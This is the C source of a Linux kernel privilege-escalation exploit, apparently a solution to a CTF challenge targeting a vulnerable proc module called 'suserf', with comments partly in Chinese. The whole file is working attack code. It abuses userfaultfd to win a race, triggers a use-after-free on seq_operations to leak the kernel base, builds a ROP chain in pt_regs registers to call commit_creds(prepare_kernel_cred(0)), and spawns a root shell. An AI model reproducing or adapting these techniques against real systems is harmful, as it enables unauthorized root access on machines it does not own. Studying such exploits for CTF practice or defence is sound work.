//gcc -masm=intel -static exploit.c -o exploit
//home/race_condition/userfaultfd/suserf/exploit

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/xattr.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff8107fc70
#define pop_rdx_ret 0xffffffff8112b2ca
#define mov_rdi_rax_pop_rbp_ret 0xffffffff814d753b

#define prepare_kernel_cred 0xffffffff810b8360
#define commit_creds 0xffffffff810b7fb0
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00974
#define single_start 0xffffffff812cbc90

int             suserf_fd;
size_t          seq_fd;
static size_t   page_size;
static char*    page = NULL;

struct suserf_note {
    size_t idx;
    size_t size;
    char* buf;
};

void suserf_add(size_t idx, size_t size, char* buf)
{
    struct suserf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(suserf_fd, 0x112233, &note);
}

// kfree(&notebook[idx]->data)
// copy data to buf
void suserf_del(size_t idx, char* buf)
{
    struct suserf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(suserf_fd, 0x334455, &note);
}

// 把 notebook[idx]->data 数据读到 buf
// ssize_t suserf_read(int idx, void* buf)
// {
//     return read(suserf_fd, buf, idx);
// }

static void* leak_thread(void *arg)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;
    size_t buf[0x10];

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1)
            err_exit("Poll error!");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            err_exit("EOF on userfaultfd!");

        if (nread == -1)
            err_exit("Read error!");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            err_exit("Unexpected event on userfaultfd!\n");

        puts("\033[34m\033[1m[*] Allocation seq_operations in userfaultfd...\033[0m");
        // freelist->1->0
        suserf_del(1, buf);
        // seq_operations 分配到 chunk0
        seq_fd = open("/proc/self/stat", O_RDONLY);

        // suserf_read(0, buf);
        suserf_del(0, buf);
        print_binary(buf, 0x20);

        // kernel_offset = buf[0];
        kernel_offset = buf[1];
        printf("\033[32m\033[1m[*] Leak ptr: 0x%lx\033[0m\n", kernel_offset);
        // kernel_offset -= 0xffffffff812cbc90;
        kernel_offset -= 0xffffffff812cbcd0;
        kernel_base += kernel_offset;

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            err_exit("Ioctl-UFFDIO_COPY!");

        return NULL;
    }
}

size_t  SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
// size_t  INIT_CRED;
size_t  POP_RDI_RET;
size_t  POP_RDX_RET;
size_t  COMMIT_CREDS;
size_t  ADD_RSP_0x198_POP_RBX_POP_RBP_RET;
size_t  MOV_RDI_RAX_POP_RBP_RET;
size_t  PREPARE_KERNEL_CRED;

int main(int argc, char **argv, char **envp)
{
    pthread_t   uffd_leak_thread;
    char*   uffd_buf_leak;
    char*   uffd_buf_uaf;
    char*   uffd_buf_hack;
    size_t   buf[0x50];

    bind_core(0);

    page = malloc(0x1000);
    page_size = sysconf(_SC_PAGE_SIZE);

    suserf_fd = open("/proc/suserfproc", O_RDONLY);
    if (suserf_fd < 0) {
        err_exit("Failed to open /proc/suserfproc!");
    }

    // 分配匿名内存 uffd_buf_leek，并没有实际分配物理页面
    note_info("Fegister userfaultfd...");
    uffd_buf_leak = (char *)mmap(NULL, page_size, PROT_READ | PROT_WRITE, 
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // 通过 userfaultfd 系统调用注册一个 userfaultfd
    register_userfaultfd(&uffd_leak_thread, uffd_buf_leak, page_size, leak_thread);

    for(int i = 0; i < 2; i++){
        suserf_add(i, 0x20, buf);
    }
    // suserf_del 函数里 copy_to_user 通过 userfaultfd 阻塞, 执行 leak_thread 函数
    suserf_del(0, uffd_buf_leak);

    printf("\033[32m\033[1m[+] Kernel offset: 0x%lx\033[0m\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: 0x%lx\033[0m\n", kernel_base);

    ADD_RSP_0x198_POP_RBX_POP_RBP_RET = 0xffffffff816bda54 + kernel_offset;
    printf("\033[32m\033[1m[+] ADD_RSP_0x198_POP_RBX_POP_RBP_RET: 0x%lx\033[0m\n", 
        ADD_RSP_0x198_POP_RBX_POP_RBP_RET);

    buf[0] = ADD_RSP_0x198_POP_RBX_POP_RBP_RET;
    suserf_add(2, 0x20, buf); //use chunk0, seq_ops[0] = ADD_RSP_0x198_POP_RBX_POP_RBP_RET

    // kernel gadget
    POP_RDI_RET = pop_rdi_ret + kernel_offset;
    POP_RDX_RET = pop_rdx_ret + kernel_offset;
    // INIT_CRED = init_cred + kernel_offset;
    COMMIT_CREDS = commit_creds + kernel_offset;
    MOV_RDI_RAX_POP_RBP_RET = mov_rdi_rax_pop_rbp_ret + kernel_offset;
    PREPARE_KERNEL_CRED = prepare_kernel_cred + kernel_offset;
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE = swapgs_restore_regs_and_return_to_usermode;
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += kernel_offset;
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE += 16;   // push r8

    // pt_regs 来完成 ROP
    __asm__(
       "mov r15,   POP_RDI_RET;"
       "mov r14,   0;"
       "mov r13,   PREPARE_KERNEL_CRED;"
       "mov r12,   MOV_RDI_RAX_POP_RBP_RET;"
       "mov rbp,   0xbbbbbbbbbb;"
       "mov rbx,   POP_RDX_RET;"
       "mov r11,   0x1111111111;"
       "mov r10,   COMMIT_CREDS;"
       "mov r9,    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;"
       "mov r8,    0x8888888888;"
       "xor rax,   rax;"
       "mov rcx,   0xcccccccccc;"
       
       "mov rdx,   8;"
       "mov rsi,   rsp;"
       "mov rdi,   seq_fd;"             // 通过 seq_operations->stat 来触发
       "syscall"
    );
    puts("\033[32m\033[1m[+] Successful to get the root.\033[0m");
    puts("\033[34m\033[1m[*] Execve root shell now...\033[0m");
    system("/bin/sh");
}
